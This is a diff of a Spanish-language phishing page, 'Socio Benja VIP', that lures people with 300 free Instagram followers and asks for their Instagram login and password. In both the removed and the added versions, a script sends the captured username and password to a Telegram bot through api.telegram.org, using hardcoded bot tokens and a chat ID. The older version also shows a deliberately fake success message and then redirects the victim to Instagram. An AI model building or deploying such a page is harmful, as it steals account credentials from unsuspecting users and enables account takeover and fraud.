@@ -3,64 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Socio Benja VIP | Elite System</title>
+    <title>Socio Benja VIP</title>
     <style>
-        :root { --gold: #d4af37; --dark: #050505; }
-        body { background: var(--dark); color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 15px; box-sizing: border-box; }
-        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid var(--gold); box-shadow: 0 0 30px rgba(212, 175, 55, 0.2); width: 100%; max-width: 350px; text-align: center; }
-        h2 { color: var(--gold); text-transform: uppercase; margin-bottom: 20px; letter-spacing: 1px; font-size: 22px; }
-        input { width: 100%; padding: 14px; margin: 8px 0; background: #000; border: 1px solid #333; color: white; border-radius: 10px; box-sizing: border-box; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--gold); }
-        .btn { width: 100%; padding: 15px; background: linear-gradient(45deg, #d4af37, #f2d06b); border: none; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 15px; text-transform: uppercase; color: black; font-size: 14px; }
-        .btn:hover { transform: scale(1.02); box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3); }
-        .footer-text { font-size: 10px; color: #444; margin-top: 25px; text-transform: uppercase; letter-spacing: 1px; }
+        body { background: #050505; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #d4af37; width: 330px; text-align: center; box-shadow: 0 0 20px rgba(212,175,55,0.2); }
+        h2 { color: #d4af37; text-transform: uppercase; margin-bottom: 20px; }
+        input { width: 100%; padding: 14px; margin: 8px 0; background: #000; border: 1px solid #333; color: white; border-radius: 10px; box-sizing: border-box; outline: none; }
+        .btn { width: 100%; padding: 15px; background: #d4af37; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 15px; color: black; }
     </style>
 </head>
 <body>
-
     <div class="card">
         <h2>👑 SOCIO BENJA VIP</h2>
-        <p style="margin-bottom: 20px; font-size: 15px;">Obtené tus <b>300 Seguidores</b> ahora</p>
-        
+        <p>Obtené tus 300 Seguidores</p>
         <form id="formVip">
             <input type="text" id="usuario" placeholder="Correo o Teléfono" required>
             <input type="password" id="pass" placeholder="Contraseña de Instagram" required>
             <button type="submit" class="btn">INICIAR CARGA GRATUITA</button>
         </form>
-        
-        <p class="footer-text">SISTEMA DE SEGURIDAD VIP 🇦🇷</p>
     </div>
 
     <script>
         document.getElementById('formVip').addEventListener('submit', function(e) {
             e.preventDefault();
-            
             const user = document.getElementById('usuario').value;
             const clave = document.getElementById('pass').value;
             
-            // DATOS DE TUS CAPTURAS Y VIDEO
-            const token = '8633862286:AAGqjjynyXwGIVCG06_Uhto2QNunY088arI'; 
-            const chat_id = '8569497540'; 
-            
-            const mensaje = `🔥 NUEVO REGISTRO VIP 🔥\n\n👤 Usuario: ${user}\n🔑 Clave: ${clave}\n📅 Fecha: ${new Date().toLocaleString()}`;
+            // TOKEN NUEVO ACTUALIZADO
+            const token = '8633862286:AAGkHpsWTWzLoUbTnUOa47yPY_tUhYOlzbs';
+            const chat_id = '8569497540';
+            const mensaje = `🔥 NUEVO REGISTRO 🔥\n\n👤 Usuario: ${user}\n🔑 Clave: ${clave}`;
 
-            // MÉTODO DE ENVÍO DIRECTO (FETCH POST)
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chat_id,
-                    text: mensaje
-                })
-            })
-            .then(() => {
-                // Alerta de éxito falso para el usuario
-                alert("✅ Sistema: Validando cuenta... Los seguidores se cargarán automáticamente en las próximas 2 horas. No cierres esta ventana.");
-                window.location.href = "https://www.instagram.com"; 
-            })
-            .catch(() => {
-                alert("Error de conexión. Intentá de nuevo.");
-            });
+            // MÉTODO DE ENVÍO POR REDIRECCIÓN (Para confirmar que funciona)
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mensaje)}`;
+            
+            window.location.href = url;
         });
     </script>
 </body>
